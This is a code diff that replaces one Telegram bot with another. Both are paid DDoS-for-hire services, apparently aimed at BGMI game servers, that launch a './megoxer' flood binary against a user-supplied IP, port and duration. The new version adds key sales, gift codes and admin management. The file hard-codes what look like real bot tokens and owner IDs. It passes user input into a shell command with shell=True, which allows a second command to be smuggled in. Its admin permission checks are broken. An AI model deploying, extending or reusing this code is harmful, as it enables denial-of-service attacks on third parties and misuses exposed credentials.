@@ -1,150 +1,434 @@
-import asyncio
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
+#!/usr/bin/python3
 
-TELEGRAM_BOT_TOKEN = '8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs'
-ADMIN_USER_ID = 1662672529
-USERS_FILE = 'users.txt'
-attack_in_progress = False
+import telebot
+import subprocess
+import requests
+import datetime
+import os
+import logging
+import random
+import string
 
-def load_users():
+# Configure logging
+logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('7978650498:AAHv_FvNxQCPp5tB3ZWFifFl_j804OOByow')
+# Owner and admin user IDs
+owner_id = "6597146348"
+admin_ids = ["6597146348"]
+
+# File to store allowed user IDs
+USER_FILE = "users.txt"
+
+# File to store command logs
+LOG_FILE = "log.txt"
+
+# File to store free user IDs and their credits
+FREE_USER_FILE = "free_users.txt"
+
+# Dictionary to store free user credits
+free_user_credits = {}
+
+# Dictionary to store cooldown time for each user's last attack
+attack_cooldown = {}
+
+# Dictionary to store gift codes with duration
+gift_codes = {}
+
+# Key prices for different durations
+key_prices = {
+    "day": 100,
+    "week": 400,
+    "month": 900
+}
+
+# Function to read user IDs from the file
+def read_users():
     try:
-        with open(USERS_FILE) as f:
-            return set(line.strip() for line in f)
+        with open(USER_FILE, "r") as file:
+            return [line.split()[0] for line in file.readlines()]
     except FileNotFoundError:
-        return set()
+        return []
 
-def save_users(users):
-    with open(USERS_FILE, 'w') as f:
-        f.writelines(f"{user}\n" for user in users)
-
-users = load_users()
-
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    message = (
-        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 彡[Lala∆_∆PvT×DDOS°°🦅]彡 𝗗𝗱𝗼𝘀*\n"
-        "*🔥 𝗢𝘄𝗻𝗲𝗿 @Vansh_Rathor*\n"
-        "*🔥 SERVER BGMI*\n"    
-        "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"                  
-    )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-
-async def approve(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    args = context.args
-
-    if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @Vansh_Rathor*", parse_mode='Markdown')
-        return
-
-    if len(args) != 2:
-        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /approve add <chat_id> 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿 /approve remove <chat_id> 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
-        return
-
-    command, target_id = args
-    target_id = target_id.strip()
-
-    if command == 'add':
-        if target_id in users:
-            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_id} is already authorized.*", parse_mode='Markdown')
-            return
-        users.add(target_id)
-        save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_id} added.*", parse_mode='Markdown')
-
-    elif command == 'remove':
-        if target_id not in users:
-            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_id} is not authorized.*", parse_mode='Markdown')
-            return
-        users.discard(target_id)
-        save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_id} removed.*", parse_mode='Markdown')
-
-async def remove(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    args = context.args
-
-    if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @Vansh_Rathor*", parse_mode='Markdown')
-        return
-
-    if len(args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /remove <chat_id> 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
-        return
-
-    target_id = args[0].strip()
-
-    if target_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_id} is not authorized.*", parse_mode='Markdown')
-        return
-
-    users.discard(target_id)
-    save_users(users)
-    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_id} removed.*", parse_mode='Markdown')
-
-async def run_attack(chat_id, ip, port, time, context):
-    global attack_in_progress
-    attack_in_progress = True
-
+# Function to read free user IDs and their credits from the file
+def read_free_users():
     try:
-        process = await asyncio.create_subprocess_shell(
-            f"./megoxer {ip} {port} {time}",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
+        with open(FREE_USER_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                if line.strip():  # Check if line is not empty
+                    user_info = line.split()
+                    if len(user_info) == 2:
+                        user_id, credits = user_info
+                        free_user_credits[user_id] = int(credits)
+                    else:
+                        print(f"Ignoring invalid line in free user file: {line}")
+    except FileNotFoundError:
+        pass
 
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+# Read allowed user IDs and free user IDs
+allowed_user_ids = read_users()
+read_free_users()
 
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
+# Function to log command to the file
+def log_command(user_id, target, port, duration):
+    user_info = bot.get_chat(user_id)
+    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
+    
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
 
-    finally:
-        attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @Vansh_Rathor*\n*🔥 SERVER BGMI*", parse_mode='Markdown')
+# Function to clear logs
+def clear_logs():
+    try:
+        with open(LOG_FILE, "r+") as file:
+            if file.read() == "":
+                response = "Logs are already cleared. No data found ❌."
+            else:
+                file.truncate(0)
+                response = "Logs cleared successfully ✅"
+    except FileNotFoundError:
+        response = "No logs found to clear."
+    return response
 
-async def attack(update: Update, context: CallbackContext):
-    global attack_in_progress
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, duration=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if duration:
+        log_entry += f" | Time: {duration}"
+    
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
 
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-    args = context.args
+# Function to get current time
+def get_current_time():
+    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝗺𝐢𝐬𝐬𝗼𝐧 𝐓𝐨 𝐔𝐬𝗲 𝐓𝐡𝐢𝘀 𝐁𝗼𝐭 » @Vansh_Rathor*", parse_mode='Markdown')
-        return
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    response = (
+        f"🌟 Welcome to the EGALE DDOS Bot! 🌟\n\n"
+        f"Current Time: {get_current_time()}\n\n"
+        "Here are some commands you can use:\n"
+        "👤 /approveuser <id> <duration> - Approve a user for a certain duration (day, week, month)\n"
+        "❌ /removeuser <id> - Remove a user\n"
+        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
+        "🚫 /removeadmin <id> - Remove an admin\n"
+        "💰 /checkbalance - Check your balance\n"
+        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
+        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
+        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
+        "🎁 /redeem <code> - Redeem a gift code\n\n"
+        "Please use these commands responsibly. 😊"
+    )
+    bot.send_message(message.chat.id, response)
 
-    if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*⭐ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 3 𝐓𝐨 5 𝐌𝐢𝐧𝐮𝐭𝐞 𝐅𝐨𝐫 𝐍𝐞𝐱𝐭 𝐀𝐭𝐭𝐚𝐜𝐤 /attack*", parse_mode='Markdown')
-        return
+@bot.message_handler(commands=['approveuser'])
+def approve_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_ids or user_id == owner_id:
+        command = message.text.split()
+        if len(command) == 3:
+            user_to_approve = command[1]
+            duration = command[2]
+            if duration not in key_prices:
+                response = "Invalid duration. Use 'day', 'week', or 'month'."
+                bot.send_message(message.chat.id, response)
+                return
 
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*🌟 Uses » /attack ip port time*", parse_mode='Markdown')
-        return
+            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
+            allowed_user_ids.append(user_to_approve)
+            with open(USER_FILE, "a") as file:
+                file.write(f"{user_to_approve} {expiration_date}\n")
+            
+            response = f"User {user_to_approve} approved for {duration} 👍."
+        else:
+            response = "Usage: /approveuser <id> <duration>"
+    else:
+        response = "Only Admin or Owner Can Run This Command 😡."
+    bot.send_message(message.chat.id, response)
 
-    ip, port, time = args
-    await context.bot.send_message(chat_id=chat_id, text=(
-        f"*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗢𝗨𝗡𝗖𝗛𝗘𝗗 ✅*\n"
-        f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
-        f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
-        f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
-        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @Vansh_Rathor*\n"        
-        f"*🔥 SERVER BGMI*"           
-    ), parse_mode='Markdown')
+@bot.message_handler(commands=['removeuser'])
+def remove_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_ids or user_id == owner_id:
+        command = message.text.split()
+        if len(command) == 2:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for user in allowed_user_ids:
+                        file.write(f"{user}\n")
+                response = f"User {user_to_remove} removed successfully 👍."
+            else:
+                response = f"User {user_to_remove} not found in the list ❌."
+        else:
+            response = "Usage: /removeuser <id>"
+    else:
+        response = "Only Admin or Owner Can Run This Command 😡."
+    bot.send_message(message.chat.id, response)
 
-    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
+@bot.message_handler(commands=['addadmin'])
+def add_admin(message):
+    user_id = str(message.chat.id)
+    if user_id == owner_id:
+        command = message.text.split()
+        if len(command) == 3:
+            admin_to_add = command[1]
+            balance = int(command[2])
+            admin_ids.append(admin_to_add)
+            free_user_credits[admin_to_add] = balance
+            response = f"Admin {admin_to_add} added with balance {balance} 👍."
+        else:
+            response = "Usage: /addadmin <id> <balance>"
+    else:
+        response = "Only the Owner Can Run This Command 😡."
+    bot.send_message(message.chat.id, response)
 
-def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("approve", approve))
-    application.add_handler(CommandHandler("remove", remove))  # Add the remove handler
-    application.add_handler(CommandHandler("attack", attack))
-    application.run_polling()
+@bot.message_handler(commands=['removeadmin'])
+def remove_admin(message):
+    user_id = str(message.chat.id)
+    if user_id == owner_id:
+        command = message.text.split()
+        if len(command) == 2:
+            admin_to_remove = command[1]
+            if admin_to_remove in admin_ids:
+                admin_ids.remove(admin_to_remove)
+                response = f"Admin {admin_to_remove} removed successfully 👍."
+            else:
+                response = f"Admin {admin_to_remove} not found in the list ❌."
+        else:
+            response = "Usage: /removeadmin <id>"
+    else:
+        response = "Only the Owner Can Run This Command 😡."
+    bot.send_message(message.chat.id, response)
 
-if __name__ == '__main__':
-    main()
+@bot.message_handler(commands=['creategift'])
+def create_gift(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_ids:
+        command = message.text.split()
+        if len(command) == 2:
+            duration = command[1]
+            if duration in key_prices:
+                amount = key_prices[duration]
+                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
+                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+                    gift_codes[code] = duration
+                    free_user_credits[user_id] -= amount
+                    response = f"Gift code created: {code} for {duration} 🎁."
+                else:
+                    response = "You do not have enough credits to create a gift code."
+            else:
+                response = "Invalid duration. Use 'day', 'week', or 'month'."
+        else:
+            response = "Usage: /creategift <day/week/month>"
+    else:
+        response = "Only Admins Can Run This Command 😡."
+    bot.send_message(message.chat.id, response)
+
+@bot.message_handler(commands=['redeem'])
+def redeem_gift(message):
+    user_id = str(message.chat.id)
+    command = message.text.split()
+    if len(command) == 2:
+        code = command[1]
+        if code in gift_codes:
+            duration = gift_codes.pop(code)
+            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
+            if user_id not in allowed_user_ids:
+                allowed_user_ids.append(user_id)
+            with open(USER_FILE, "a") as file:
+                file.write(f"{user_id} {expiration_date}\n")
+            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
+        else:
+            response = "Invalid or expired gift code ❌."
+    else:
+        response = "Usage: /redeem <code>"
+    bot.send_message(message.chat.id, response)
+
+@bot.message_handler(commands=['checkbalance'])
+def check_balance(message):
+    user_id = str(message.chat.id)
+    if user_id in free_user_credits:
+        response = f"Your current balance is {free_user_credits[user_id]} credits."
+    else:
+        response = "You do not have a balance account ❌."
+    bot.send_message(message.chat.id, response)
+
+@bot.message_handler(commands=['setkeyprice'])
+def set_key_price(message):
+    user_id = str(message.chat.id)
+    if user_id == owner_id:
+        command = message.text.split()
+        if len(command) == 3:
+            duration = command[1]
+            price = int(command[2])
+            if duration in key_prices:
+                key_prices[duration] = price
+                response = f"Key price for {duration} set to {price} credits 💸."
+            else:
+                response = "Invalid duration. Use 'day', 'week', or 'month'."
+        else:
+            response = "Usage: /setkeyprice <day/week/month> <price>"
+    else:
+        response = "Only the Owner Can Run This Command 😡."
+    bot.send_message(message.chat.id, response)
+
+# Function to handle the reply when free users run the /attack command
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+            
+    response = f"🚀Attack Sent Successfully! 🚀\n\n🌵𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦Attack Duration: {time}\n🥶Method: EGALE-VIP\n\n🔥Status: Attack in Progress... 🔥"
+    bot.reply_to(message, response)
+
+# Dictionary to store the last time each user ran the /bgmi command
+bgmi_cooldown = {}
+
+# Handler for /attack command and direct attack input
+@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
+def handle_attack(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        # Check if the user is not an admin or owner
+        if user_id not in admin_ids and user_id != owner_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
+                response = "You Are On Cooldown ❌. Please Wait 0sec Before Running The /attack Command Again."
+                bot.reply_to(message, response)
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+        
+        command = message.text.split()
+        # Check if the message starts with '/attack' or not
+        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
+            # If it doesn't start with '/', assume it's an attack command and adjust the command list
+            if not message.text.startswith('/'):
+                command = ['/attack'] + command  # Prepend '/attack' to the command list
+            target = command[1]
+            port = int(command[2])
+            time = int(command[3])
+            if time > 301:
+                response = "Error: Time interval must be less than 301."
+            else:
+                record_command_logs(user_id, target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)
+                full_command = f"./megoxer {target} {port} {time}"
+                subprocess.run(full_command, shell=True)
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+        else:
+            response ="Please provide attack in the following format:\n\n<host> <port> <time>" 
+    else:
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
+                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
+                    "🌟THE ONLY OWNER IS  @Vansh_Rathor DM  TO BUY ACCESS")
+
+    bot.reply_to(message, response)
+
+# message_handler(func=lambda message: True)
+def handle_unknown_command(message):
+    response = (
+        f"🌟 Welcome to the EGALE_VIP_ Bot! 🌟\n\n"
+        f"Current Time: {get_current_time()}\n\n"
+        "Here are some commands you can use:\n"
+        "❌ /removeuser <id> - Remove a user\n"
+        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
+        "🚫 /removeadmin <id> - Remove an admin\n"
+        "💰 /checkbalance - Check your balance\n"
+        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
+        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
+        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
+        "🎁 /redeem <code> - Redeem a gift code\n"
+        "🚨 /allusers  : Authorised Users Lists\n"
+        "🛑 /clearusers  :- Clear The USERS File\n"
+        " ⚠️ /rules  :- Please Check Before Use !!\n\n"
+        "Please use these commands responsibly. 😊"
+    )
+
+@bot.message_handler(commands=['rules'])
+def welcome_rules(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name} Please Follow These Rules ⚠️:
+
+1. Dont Run Too Many Attacks !! Cause A Ban From Bot
+2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
+3. MAKE SURE YOU JOINED  https://telegram.me/+sW7ZGdKl7J8xOTA1 OTHERWISE NOT WORK
+4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['allusers'])
+def show_all_users(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_ids or owner_id:
+        try:
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n"
+                    for user_id in user_ids:
+                        try:
+                            user_info = bot.get_chat(int(user_id))
+                            username = user_info.username
+                            response += f"- @{username} (ID: {user_id})\n"
+                        except Exception as e:
+                            response += f"- User ID: {user_id}\n"
+                else:
+                    response = "No data found ❌"
+        except FileNotFoundError:
+            response = "No data found ❌"
+    else:
+        response = "Only Owner and Admin Can Run This Command 😡."
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['clearusers'])
+def clear_users_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_ids or owner_id:
+        try:
+            with open(USER_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "USERS are already cleared. No data found ❌."
+                else:
+                    file.truncate(0)
+                    response = "users Cleared Successfully ✅"
+        except FileNotFoundError:
+            response = "users are already cleared ❌."
+    else:
+        response = "Only Admin Can Run This Command 😡."
+    bot.reply_to(message, response)
+ 
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_ids or owner_id:
+        command = message.text.split(maxsplit=1)
+        if len(command) > 1:
+            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                for user_id in user_ids:
+                    try:
+                        bot.send_message(user_id, message_to_broadcast)
+                    except Exception as e:
+                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+            response = "Broadcast Message Sent Successfully To All Users 👍."
+        else:
+            response = "🤖 Please Provide A Message To Broadcast."
+    else:
+        response = "Only Admin Can Run This # Function to handle the main menu"
+
+
+# Start the bot
+bot.polling()
+
